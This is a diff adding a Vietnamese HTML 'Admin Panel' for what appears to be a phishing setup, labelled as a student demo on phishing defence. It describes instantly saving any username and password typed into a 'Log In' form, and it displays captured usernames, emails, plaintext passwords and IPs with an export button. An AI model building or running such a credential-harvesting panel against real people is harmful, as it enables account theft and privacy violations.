@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel - User Management</title>
+  <link rel="stylesheet" href="admin.css">
+</head>
+<body>
+  <div class="admin-container">
+    <header class="admin-header">
+      <h1>🔒 Admin Panel - User Management</h1>
+      <p>Quản lý tài khoản người dùng đã đăng ký</p>
+      <div class="stats">
+        <div class="stat-card">
+          <h3 id="total-users">0</h3>
+          <p>Tổng tài khoản</p>
+        </div>
+        <div class="stat-card">
+          <h3 id="recent-users">0</h3>
+          <p>Đăng ký 24h qua</p>
+        </div>
+        <div class="stat-card">
+          <h3 id="last-updated">--:--:--</h3>
+          <p>Cập nhật cuối</p>
+        </div>
+      </div>
+    </header>
+
+    <main class="admin-content">
+      <div class="actions">
+        <button class="btn-refresh" onclick="loadUsers()">🔄 Làm mới</button>
+        <button class="btn-export" onclick="exportData()">📊 Xuất dữ liệu</button>
+        <button class="btn-clear" onclick="clearAllData()">🗑️ Xóa tất cả</button>
+      </div>
+
+      <div class="warning-box">
+        <h3>⚠️ Cảnh báo bảo mật</h3>
+        <p>Đây là trang admin để test hệ thống bảo vệ người dùng. Trong thực tế, việc lưu mật khẩu người dùng là <strong>vi phạm pháp luật</strong> và có thể dẫn đến truy tố hình sự.</p>
+        <p><strong>Mục đích:</strong> Demo cho đồ án bảo vệ người dùng khỏi phishing attacks.</p>
+        <p><strong>Cách hoạt động:</strong> Bất kỳ ai nhập username/password và click "Log In" sẽ được lưu vào database ngay lập tức.</p>
+      </div>
+
+      <div class="users-table-container">
+        <table class="users-table" id="users-table">
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Username</th>
+              <th>Email</th>
+              <th>Password</th>
+              <th>IP Cuối</th>
+              <th>Đăng nhập cuối</th>
+              <th>Thao tác</th>
+            </tr>
+          </thead>
+          <tbody id="users-tbody">
+            <tr>
+              <td colspan="5" class="loading">Đang tải dữ liệu...</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </main>
+  </div>
+
+  <script src="admin.js"></script>
+</body>
+</html>
